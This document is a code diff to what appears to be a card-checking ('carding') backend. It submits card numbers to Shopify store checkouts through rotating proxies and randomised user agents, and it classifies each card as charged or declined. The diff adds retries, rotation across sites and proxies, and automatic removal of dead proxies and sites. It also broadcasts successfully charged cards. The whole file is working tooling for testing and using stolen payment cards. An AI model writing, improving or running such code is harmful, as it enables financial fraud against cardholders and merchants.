@@ -117,230 +117,283 @@ interface CardResult {
   allProxiesDead?: boolean;
 }
 
-// Check a single card against the Shopify API with proxy rotation
+// Per-fetch timeout & retry tuning (aligned with /sh shopify-charge-check)
+const FETCH_TIMEOUT_MS = 12_000;
+const UNKNOWN_RETRY_ATTEMPTS = 1;
+const MAX_SITE_ATTEMPTS = 3;
+const wait = (ms: number) => new Promise((r) => setTimeout(r, ms));
+
+type SiteEntry = { url: string; price: number | null };
+type ProxyEntry = { id: string; ip: string; port: string; username: string | null; password: string | null };
+type ApiCheckResult = {
+  status: string;
+  message: string;
+  apiResponse: string;
+  rawResponse: string;
+  price: number;
+  priceStr: string;
+  proxyDead?: boolean;
+  siteDead?: boolean;
+};
+
+const formatProxy = (p: ProxyEntry) =>
+  p.username && p.password ? `${p.ip}:${p.port}:${p.username}:${p.password}` : `${p.ip}:${p.port}`;
+
+const callApiOnce = async (cc: string, site: string, proxy: string): Promise<ApiCheckResult> => {
+  const apiUrl = `${API_BASE_URL}?${encodeURIComponent(cc)}&url=${encodeURIComponent(site)}&proxy=${encodeURIComponent(proxy)}`;
+
+  const controller = new AbortController();
+  const timeoutId = setTimeout(() => controller.abort(), FETCH_TIMEOUT_MS);
+
+  try {
+    const response = await fetch(apiUrl, {
+      method: 'GET',
+      headers: {
+        'Accept': 'application/json, text/plain, */*',
+        'User-Agent': getRandomItem(userAgents),
+        'Cache-Control': 'no-cache',
+      },
+      signal: controller.signal,
+    });
+    clearTimeout(timeoutId);
+    const rawText = await response.text();
+
+    if (!rawText || rawText.trim() === '') {
+      return { status: 'unknown', message: 'Empty response', apiResponse: '', rawResponse: '', price: 0, priceStr: '$0.00', siteDead: true };
+    }
+
+    const rawLower = rawText.toLowerCase();
+
+    // Proxy errors
+    let isValidApiResponseEarly = false;
+    try {
+      const parsed = JSON.parse(rawText);
+      if (parsed && (parsed.Gateway || parsed.Response || parsed.Price !== undefined || parsed.status || parsed.message || parsed.Charged !== undefined)) {
+        isValidApiResponseEarly = true;
+      }
+    } catch { /* not JSON */ }
+
+    const isProxyError = !isValidApiResponseEarly && (
+      rawLower.includes('407') || rawLower.includes('proxy error') ||
+      rawLower.includes('proxy authentication') || rawLower.includes('connection refused') ||
+      rawLower.includes('proxy connect') || rawLower.includes('tunneling socket') ||
+      rawLower.includes('missing proxy param') || rawLower.includes('"error_code":"proxy dead"')
+    );
+    if (isProxyError) {
+      return { status: 'unknown', message: 'Proxy dead', apiResponse: '', rawResponse: rawText, price: 0, priceStr: '$0.00', proxyDead: true };
+    }
+
+    // DELIVERY_ADDRESS — declined
+    if (rawText.includes('DELIVERY_ADDRESS')) {
+      return { status: 'dead', message: 'DELIVERY_ADDRESS error - Declined', apiResponse: 'DELIVERY_ADDRESS', rawResponse: rawText, price: 0, priceStr: '$0.00' };
+    }
+
+    // Strike responses (site issue, returned as siteDead so caller can rotate site)
+    const matchedStrike = strikeResponses.find(s => rawLower.includes(s.toLowerCase()));
+    if (matchedStrike) {
+      return { status: 'unknown', message: `${matchedStrike} - site issue`, apiResponse: matchedStrike, rawResponse: rawText, price: 0, priceStr: '$0.00', siteDead: true };
+    }
+
+    const isBadResponse = badResponses.some(bad => rawLower.includes(bad.toLowerCase()));
+    if (isBadResponse) {
+      return { status: 'unknown', message: 'Bad response - site issue', apiResponse: '', rawResponse: rawText, price: 0, priceStr: '$0.00', siteDead: true };
+    }
+
+    let { price, priceStr } = extractPrice(rawText);
+    let apiStatus = 'unknown';
+    let apiMessage = '';
+    let apiResponse = '';
+
+    const isEmptyOrErrorOnly = (text: string): boolean => {
+      const trimmed = text.trim().toLowerCase();
+      return !trimmed || trimmed === 'error:' || trimmed === 'error' || trimmed === 'error: ' || trimmed.length < 3;
+    };
+
+    try {
+      const json = JSON.parse(rawText);
+      if (json.Price !== undefined && json.Price !== null && json.Price !== '?') {
+        const parsedPrice = typeof json.Price === 'number' ? json.Price : parseFloat(String(json.Price).replace(/[^0-9.]/g, ''));
+        if (!isNaN(parsedPrice) && parsedPrice > 0) { price = parsedPrice; priceStr = `$${parsedPrice.toFixed(2)}`; }
+      }
+      if (json.Response) { apiResponse = String(json.Response).replace(/<[^>]*>/g, ''); }
+      apiMessage = json.Response || json.message || json.msg || json.error || '';
+
+      const responseText = (apiResponse || apiMessage || '').trim();
+      const chargedFlag = String(json.Charged ?? json.Charge ?? '').toLowerCase() === 'true' || json.Charged === true || json.Charge === true;
+      const chargedFalse = String(json.Charged ?? json.Charge ?? '').toLowerCase() === 'false' || json.Charged === false || json.Charge === false;
+      const approvedFlag = String(json.Approved ?? '').toLowerCase() === 'true' || json.Approved === true;
+
+      if (chargedFlag || approvedFlag || json.status === 'CHARGED' || json.status === 'success' || json.full_response === true) {
+        apiStatus = 'live'; apiMessage = json.Response || json.message || 'Charged';
+      } else if (chargedFalse || String(json.Approved ?? '').toLowerCase() === 'false' || json.status === 'DECLINED' || json.status === 'failed' || json.full_response === false || json.status === 'DS_REQUIRED' || json.status === '3DS_REQUIRED') {
+        apiStatus = 'dead'; apiMessage = json.Response || json.message || json.error || 'Declined';
+      } else if (isEmptyOrErrorOnly(responseText) && price === 0) {
+        apiStatus = 'unknown';
+      } else if (json.status === 'error') {
+        const errMsg = (json.message || json.error || '').trim().toLowerCase();
+        if (errMsg && errMsg !== 'error:' && errMsg !== 'error' && errMsg.length > 5) {
+          apiStatus = 'dead'; apiMessage = json.message || json.error || 'Declined';
+        } else {
+          apiStatus = 'unknown'; apiMessage = 'Request failed';
+        }
+      } else {
+        const lower = String(apiMessage).toLowerCase();
+        const responseLower = (apiResponse || '').toLowerCase();
+        const combinedText = lower + ' ' + responseLower;
+        if (combinedText.includes('order_placed') || combinedText.includes('order placed') || combinedText.includes('thank you') || combinedText.includes('charged') || combinedText.includes('success') || combinedText.includes('approved')) {
+          apiStatus = 'live';
+        } else if (combinedText.includes('declined') || combinedText.includes('invalid') || combinedText.includes('expired') || combinedText.includes('insufficient') || combinedText.includes('card_declined') || combinedText.includes('incorrect') || combinedText.includes('do_not_honor') || combinedText.includes('fraud') || combinedText.includes('not accepted') || combinedText.includes('ds_required') || combinedText.includes('3ds') || combinedText.includes('3d_secure') || combinedText.includes('rejected') || combinedText.includes('pickup_card') || combinedText.includes('lost_card') || combinedText.includes('stolen_card') || combinedText.includes('restricted') || combinedText.includes('not_permitted') || combinedText.includes('generic_decline')) {
+          apiStatus = 'dead';
+        } else if (combinedText.includes('failed') || combinedText.includes('error')) {
+          const substantive = combinedText.replace(/error:?\s*/g, '').replace(/failed:?\s*/g, '').trim();
+          if (substantive.length > 3) apiStatus = 'dead';
+        }
+      }
+    } catch {
+      const lower = rawText.toLowerCase();
+      if (isEmptyOrErrorOnly(lower)) {
+        apiStatus = 'unknown';
+      } else if (lower.includes('order_placed') || lower.includes('charged') || lower.includes('success') || lower.includes('approved')) {
+        apiStatus = 'live';
+      } else if (lower.includes('declined') || lower.includes('invalid') || lower.includes('expired') || lower.includes('insufficient') || lower.includes('ds_required') || lower.includes('3ds') || lower.includes('rejected')) {
+        apiStatus = 'dead';
+      } else if (lower.includes('failed') || lower.includes('error')) {
+        const substantive = lower.replace(/error:?\s*/g, '').replace(/failed:?\s*/g, '').trim();
+        if (substantive.length > 3) apiStatus = 'dead';
+      }
+    }
+
+    return { status: apiStatus, message: apiMessage, apiResponse: apiResponse || apiMessage, rawResponse: rawText, price, priceStr };
+  } catch (error) {
+    clearTimeout(timeoutId);
+    const errMsg = error instanceof Error ? error.message : 'Error';
+    const isTimeout = errMsg.toLowerCase().includes('abort') || errMsg.toLowerCase().includes('timeout');
+    return {
+      status: 'unknown',
+      message: isTimeout ? 'Timeout' : errMsg,
+      apiResponse: '',
+      rawResponse: errMsg,
+      price: 0,
+      priceStr: '$0.00',
+      siteDead: isTimeout,
+    };
+  }
+};
+
+const tryWithRetry = async (cc: string, site: string, proxy: string): Promise<ApiCheckResult> => {
+  let result = await callApiOnce(cc, site, proxy);
+  if (result.proxyDead || result.siteDead) return result;
+  if (result.status === 'live' || result.status === 'dead') return result;
+  for (let retry = 1; retry <= UNKNOWN_RETRY_ATTEMPTS; retry++) {
+    await wait(250 + Math.floor(Math.random() * 200));
+    result = await callApiOnce(cc, site, proxy);
+    if (result.proxyDead || result.siteDead) return result;
+    if (result.status === 'live' || result.status === 'dead') return result;
+  }
+  return result;
+};
+
+// Check a single card against the Shopify API with site + proxy rotation
 const checkSingleCard = async (
   cc: string,
-  sites: { url: string; price: number | null }[],
-  proxies: { id: string; ip: string; port: string; username: string | null; password: string | null }[],
+  sites: SiteEntry[],
+  proxies: ProxyEntry[],
   adminClient: ReturnType<typeof createClient>,
   userId: string,
   username: string | null,
 ): Promise<CardResult> => {
-  const randomSite = getRandomItem(sites);
-  const formatProxy = (p: typeof proxies[0]) =>
-    p.username && p.password ? `${p.ip}:${p.port}:${p.username}:${p.password}` : `${p.ip}:${p.port}`;
-
-  const shuffledProxies = [...proxies].sort(() => Math.random() - 0.5);
-  let result: { status: string; message: string; apiResponse: string; rawResponse: string; price: number; priceStr: string } | null = null;
-  const failedProxyIds: string[] = [];
-
-  // API REQUIRES a proxy — bail out with clear unknown if user has none
-  if (shuffledProxies.length === 0) {
+  if (proxies.length === 0) {
+    const fallbackSite = getRandomItem(sites);
     return {
       cc, computedStatus: 'unknown', apiStatus: 'UNKNOWN',
       apiMessage: 'Proxy required — add at least one proxy to use Shopify Charge',
-      apiTotal: 'N/A', rawResponse: '', usedSite: randomSite.url, allProxiesDead: true,
+      apiTotal: 'N/A', rawResponse: '', usedSite: fallbackSite.url, allProxiesDead: true,
     };
   }
-  const proxyAttempts: typeof proxies = [...shuffledProxies];
 
-  for (let attempt = 0; attempt < proxyAttempts.length; attempt++) {
-    const currentProxy = proxyAttempts[attempt];
-    const proxyStr = formatProxy(currentProxy);
-    const apiUrl = `${API_BASE_URL}?${encodeURIComponent(cc)}&url=${encodeURIComponent(randomSite.url)}&proxy=${encodeURIComponent(proxyStr)}`;
+  // Shuffle sites + proxies for fairness
+  const shuffledSites = [...sites].sort(() => Math.random() - 0.5);
+  const shuffledProxies = [...proxies].sort(() => Math.random() - 0.5);
+  const failedProxyIds: string[] = [];
+  const deadSiteUrls: string[] = [];
 
-    const controller = new AbortController();
-    const timeoutId = setTimeout(() => controller.abort(), 60000);
+  let result: ApiCheckResult | null = null;
+  let usedSite: SiteEntry = shuffledSites[0];
+  const maxSiteAttempts = Math.min(MAX_SITE_ATTEMPTS, shuffledSites.length);
 
-    try {
-      const response = await fetch(apiUrl, {
-        method: 'GET',
-        headers: {
-          'Accept': 'application/json, text/plain, */*',
-          'User-Agent': getRandomItem(userAgents),
-          'Cache-Control': 'no-cache',
-        },
-        signal: controller.signal,
-      });
-      clearTimeout(timeoutId);
-      const rawText = await response.text();
+  for (let siteAttempt = 0; siteAttempt < maxSiteAttempts; siteAttempt++) {
+    const currentSite = shuffledSites[siteAttempt];
+    usedSite = currentSite;
 
-      if (!rawText || rawText.trim() === '') {
-        result = { status: 'unknown', message: 'Empty response', apiResponse: '', rawResponse: '', price: 0, priceStr: '$0.00' };
-        break;
-      }
+    const availableProxies = shuffledProxies.filter(p => !failedProxyIds.includes(p.id));
+    if (availableProxies.length === 0) {
+      result = { status: 'unknown', message: 'All proxies failed', apiResponse: '', rawResponse: '', price: 0, priceStr: '$0.00', proxyDead: true };
+      break;
+    }
 
-      // Check for DELIVERY_ADDRESS — classify as DECLINED
-      if (rawText.includes('DELIVERY_ADDRESS')) {
-        result = { status: 'dead', message: 'DELIVERY_ADDRESS error - Declined', apiResponse: 'DELIVERY_ADDRESS', rawResponse: rawText, price: 0, priceStr: '$0.00' };
-        break;
-      }
-
-      // Check for strike responses (e.g. MERCHANDISE_EXPECTED_PRICE_MISMATCH) — track per site
-      const matchedStrike = strikeResponses.find(s => rawText.toLowerCase().includes(s.toLowerCase()));
-      if (matchedStrike) {
-        const key = randomSite.url;
-        siteStrikeCounter[key] = (siteStrikeCounter[key] || 0) + 1;
-        console.log(`[SHOPIFY-BATCH] Strike ${siteStrikeCounter[key]}/${STRIKE_THRESHOLD} for site: ${key}`);
-        if (siteStrikeCounter[key] >= STRIKE_THRESHOLD) {
-          adminClient.from('gateway_urls').delete().eq('url', key).then(() => {});
-          delete siteStrikeCounter[key];
-        }
-        result = { status: 'dead', message: `${matchedStrike} - site issue`, apiResponse: matchedStrike, rawResponse: rawText, price: 0, priceStr: '$0.00' };
-        break;
-      }
-
-      const isBadResponse = badResponses.some(bad => rawText.toLowerCase().includes(bad.toLowerCase()));
-      if (isBadResponse) {
-        result = { status: 'dead', message: 'Bad response - site issue', apiResponse: '', rawResponse: rawText, price: 0, priceStr: '$0.00' };
-        // Remove bad site
-        adminClient.from('gateway_urls').delete().eq('url', randomSite.url).then(() => {});
-        break;
-      }
-
-      let { price, priceStr } = extractPrice(rawText);
-      let apiStatus = 'unknown';
-      let apiMessage = rawText;
-      let apiResponse = '';
-
-      // Helper: check if a response is essentially empty/meaningless (should be UNKNOWN, not DEAD)
-      const isEmptyOrErrorOnly = (text: string): boolean => {
-        const trimmed = text.trim().toLowerCase();
-        return !trimmed || trimmed === 'error:' || trimmed === 'error' || trimmed === 'error: ' || trimmed.length < 3;
-      };
-
-      try {
-        const json = JSON.parse(rawText);
-        // New API: Price may be "8.00 USD" string or number
-        if (json.Price !== undefined && json.Price !== null && json.Price !== '?' ) {
-          const parsedPrice = typeof json.Price === 'number' ? json.Price : parseFloat(String(json.Price).replace(/[^0-9.]/g, ''));
-          if (!isNaN(parsedPrice) && parsedPrice > 0) { price = parsedPrice; priceStr = `$${parsedPrice.toFixed(2)}`; }
-        }
-        if (json.Response) { apiResponse = String(json.Response).replace(/<[^>]*>/g, ''); }
-        // IMPORTANT: do NOT fall back to rawText for apiMessage — it contains substrings like "Charged" that confuse keyword classification below
-        apiMessage = json.Response || json.message || json.msg || json.error || '';
-
-        // If the API returned an empty/meaningless response, treat as unknown
-        const responseText = (apiResponse || apiMessage || '').trim();
-        const chargedFlag = String(json.Charged ?? json.Charge ?? '').toLowerCase() === 'true' || json.Charged === true || json.Charge === true;
-        const approvedFlag = String(json.Approved ?? '').toLowerCase() === 'true' || json.Approved === true;
-
-        if (isEmptyOrErrorOnly(responseText) && price === 0 && !chargedFlag && !approvedFlag) {
-          apiStatus = 'unknown';
-        } else if (chargedFlag || approvedFlag || json.status === 'CHARGED' || json.status === 'success' || json.full_response === true) {
-          apiStatus = 'live'; apiMessage = json.Response || json.message || 'Charged';
-        } else if (String(json.Charged ?? '').toLowerCase() === 'false' || String(json.Approved ?? '').toLowerCase() === 'false' || json.status === 'DECLINED' || json.status === 'failed' || json.full_response === false || json.status === 'DS_REQUIRED' || json.status === '3DS_REQUIRED') {
-          apiStatus = 'dead'; apiMessage = json.Response || json.message || json.error || 'Declined';
-        } else if (json.status === 'error') {
-          // Only mark as dead if there's a meaningful error message (not just "error:")
-          const errMsg = (json.message || json.error || '').trim().toLowerCase();
-          if (errMsg && errMsg !== 'error:' && errMsg !== 'error' && errMsg.length > 5) {
-            apiStatus = 'dead'; apiMessage = json.message || json.error || 'Declined';
-          } else {
-            apiStatus = 'unknown'; apiMessage = 'Request failed';
-          }
-        } else {
-          const lower = String(apiMessage).toLowerCase();
-          const responseLower = (apiResponse || '').toLowerCase();
-          const combinedText = lower + ' ' + responseLower;
-          if (combinedText.includes('order_placed') || combinedText.includes('order placed') || combinedText.includes('thank you') || combinedText.includes('charged') || combinedText.includes('success') || combinedText.includes('approved')) {
-            apiStatus = 'live';
-          } else if (combinedText.includes('declined') || combinedText.includes('invalid') || combinedText.includes('expired') || combinedText.includes('insufficient') || combinedText.includes('card_declined') || combinedText.includes('incorrect') || combinedText.includes('do_not_honor') || combinedText.includes('fraud') || combinedText.includes('not accepted') || combinedText.includes('ds_required') || combinedText.includes('3ds') || combinedText.includes('3d_secure') || combinedText.includes('rejected') || combinedText.includes('pickup_card') || combinedText.includes('lost_card') || combinedText.includes('stolen_card') || combinedText.includes('restricted') || combinedText.includes('not_permitted') || combinedText.includes('generic_decline')) {
-            apiStatus = 'dead';
-          } else if (combinedText.includes('failed') || combinedText.includes('error')) {
-            // Only dead if there's a substantive message, not just "error:" or "failed"
-            const substantive = combinedText.replace(/error:?\s*/g, '').replace(/failed:?\s*/g, '').trim();
-            if (substantive.length > 3) {
-              apiStatus = 'dead';
-            }
-            // else stays unknown
-          }
-        }
-      } catch {
-        // JSON parse failed — could be HTML, empty, or malformed
-        const lower = rawText.toLowerCase();
-        if (isEmptyOrErrorOnly(lower)) {
-          apiStatus = 'unknown';
-        } else if (lower.includes('order_placed') || lower.includes('charged') || lower.includes('success') || lower.includes('approved')) {
-          apiStatus = 'live';
-        } else if (lower.includes('declined') || lower.includes('invalid') || lower.includes('expired') || lower.includes('insufficient') || lower.includes('ds_required') || lower.includes('3ds') || lower.includes('rejected')) {
-          apiStatus = 'dead';
-        } else if (lower.includes('failed') || lower.includes('error')) {
-          const substantive = lower.replace(/error:?\s*/g, '').replace(/failed:?\s*/g, '').trim();
-          if (substantive.length > 3) {
-            apiStatus = 'dead';
-          }
-        }
-      }
-
-      // Check for proxy errors (only if not a valid API response)
-      let isValidApiResponse = false;
-      try {
-        const parsed = JSON.parse(rawText);
-        if (parsed && (parsed.Gateway || parsed.Response || parsed.Price !== undefined || parsed.status || parsed.message)) {
-          isValidApiResponse = true;
-        }
-      } catch { /* not JSON */ }
-
-      const rawLower = rawText.toLowerCase();
-      const isProxyError = !isValidApiResponse && (
-        rawLower.includes('407') || rawLower.includes('proxy error') ||
-        rawLower.includes('proxy authentication') || rawLower.includes('connection refused') ||
-        rawLower.includes('proxy connect') || rawLower.includes('tunneling socket') ||
-        rawLower.includes('missing proxy param') || rawLower.includes('"error_code":"proxy dead"')
-      );
-
-      if (isProxyError && currentProxy) {
-        failedProxyIds.push(currentProxy.id);
-        if (attempt + 1 >= proxyAttempts.length) {
-          result = { status: 'unknown', message: 'All proxies failed (407)', apiResponse: '', rawResponse: rawText, price: 0, priceStr: '$0.00' };
-        }
+    let siteResult: ApiCheckResult | null = null;
+    for (const proxy of availableProxies) {
+      const r = await tryWithRetry(cc, currentSite.url, formatProxy(proxy));
+      if (r.proxyDead) {
+        failedProxyIds.push(proxy.id);
         continue;
       }
-
-      result = { status: apiStatus, message: apiMessage, apiResponse: apiResponse || apiMessage, rawResponse: rawText, price, priceStr };
+      siteResult = r;
       break;
-    } catch (error) {
-      clearTimeout(timeoutId);
-      const errMsg = error instanceof Error ? error.message : 'Error';
-      if (attempt + 1 >= proxyAttempts.length) {
-        result = { status: 'unknown', message: 'Timeout', apiResponse: '', rawResponse: errMsg, price: 0, priceStr: '$0.00' };
-      }
     }
+
+    if (!siteResult) {
+      // every proxy was dead this round — try next site
+      continue;
+    }
+
+    // Live/dead = definitive
+    if (siteResult.status === 'live' || siteResult.status === 'dead') {
+      result = siteResult;
+      break;
+    }
+
+    // Unknown / siteDead → rotate to next site
+    if (siteResult.siteDead) {
+      deadSiteUrls.push(currentSite.url);
+    }
+    result = siteResult;
   }
 
-  // Clean up failed proxies in background
+  if (!result) {
+    result = { status: 'unknown', message: 'No usable site/proxy', apiResponse: '', rawResponse: '', price: 0, priceStr: '$0.00' };
+  }
+
+  // Cleanup proxies + dead sites in background
   if (failedProxyIds.length > 0) {
     for (const proxyId of failedProxyIds) {
       adminClient.from('user_proxies').delete().eq('id', proxyId).then(() => {});
     }
   }
-
-  if (!result) {
-    result = { status: 'unknown', message: 'All proxies failed', apiResponse: '', rawResponse: '', price: 0, priceStr: '$0.00' };
+  for (const deadUrl of deadSiteUrls) {
+    adminClient.from('gateway_urls').delete().eq('url', deadUrl).then(() => {});
   }
 
-  const allProxiesDead = failedProxyIds.length >= proxies.length;
-
-  // Auto-remove bad/empty sites (but not strike responses — those are handled above)
+  // Strike counter management for matched strike on the final used site
   const rawLower = (result.rawResponse || '').toLowerCase();
-  const isBadSite = badResponses.some(bad => rawLower.includes(bad.toLowerCase()));
-  const isStrikeResponse = strikeResponses.some(s => rawLower.includes(s.toLowerCase()));
-  if (!isStrikeResponse && (isBadSite || (result.status === 'unknown' && (!result.rawResponse || rawLower === '' || rawLower.includes('empty response') || rawLower.includes('timeout'))))) {
-    adminClient.from('gateway_urls').delete().eq('url', randomSite.url).then(() => {});
-  } else if (!isStrikeResponse) {
-    // Normal response — reset strike counter for this site
-    if (siteStrikeCounter[randomSite.url]) {
-      delete siteStrikeCounter[randomSite.url];
+  const matchedStrike = strikeResponses.find(s => rawLower.includes(s.toLowerCase()));
+  if (matchedStrike) {
+    const key = usedSite.url;
+    siteStrikeCounter[key] = (siteStrikeCounter[key] || 0) + 1;
+    if (siteStrikeCounter[key] >= STRIKE_THRESHOLD) {
+      adminClient.from('gateway_urls').delete().eq('url', key).then(() => {});
+      delete siteStrikeCounter[key];
     }
+  } else if (siteStrikeCounter[usedSite.url]) {
+    delete siteStrikeCounter[usedSite.url];
   }
 
   // Update site price if valid
-  if (result.price > 0 && !isBadSite) {
+  if (result.price > 0) {
     if (result.price > 100) {
-      adminClient.from('gateway_urls').delete().eq('url', randomSite.url).then(() => {});
-    } else if (result.price !== Number(randomSite.price)) {
-      adminClient.from('gateway_urls').update({ price: result.price }).eq('url', randomSite.url).then(() => {});
+      adminClient.from('gateway_urls').delete().eq('url', usedSite.url).then(() => {});
+    } else if (result.price !== Number(usedSite.price)) {
+      adminClient.from('gateway_urls').update({ price: result.price }).eq('url', usedSite.url).then(() => {});
     }
   }
 
@@ -351,20 +404,22 @@ const checkSingleCard = async (
   else if (result.status === 'dead') { computedStatus = 'dead'; displayStatus = 'DECLINED'; }
   else { computedStatus = 'unknown'; displayStatus = 'UNKNOWN'; }
 
-  const chargeAmount = result.price > 0 ? result.priceStr : (randomSite.price ? `$${Number(randomSite.price).toFixed(2)}` : 'Auto');
+  const chargeAmount = result.price > 0 ? result.priceStr : (usedSite.price ? `$${Number(usedSite.price).toFixed(2)}` : 'Auto');
 
-  // Admin debug for non-dead results
+  // Admin debug for non-dead / suspicious results
   const isSuspiciousError = result.status === 'dead' &&
     (result.apiResponse || result.message || '').trim().toLowerCase() === 'error:' &&
     result.price === 0;
   if (result.status !== 'dead' || isSuspiciousError) {
-    sendAdminDebug(cc, isSuspiciousError ? 'suspicious' : result.status, result.apiResponse || result.message, result.rawResponse, username || undefined, randomSite.url);
+    sendAdminDebug(cc, isSuspiciousError ? 'suspicious' : result.status, result.apiResponse || result.message, result.rawResponse, username || undefined, usedSite.url);
   }
 
   // Broadcast CHARGED cards
   if (result.status === 'live') {
     notifyChargedCard(userId, cc, 'CHARGED', result.message, chargeAmount, 'Shopify Charge');
   }
+
+  const allProxiesDead = failedProxyIds.length >= proxies.length;
 
   return {
     cc,
@@ -373,7 +428,7 @@ const checkSingleCard = async (
     apiMessage: result.apiResponse || result.message,
     apiTotal: chargeAmount,
     rawResponse: result.rawResponse,
-    usedSite: randomSite.url,
+    usedSite: usedSite.url,
     allProxiesDead,
   };
 };
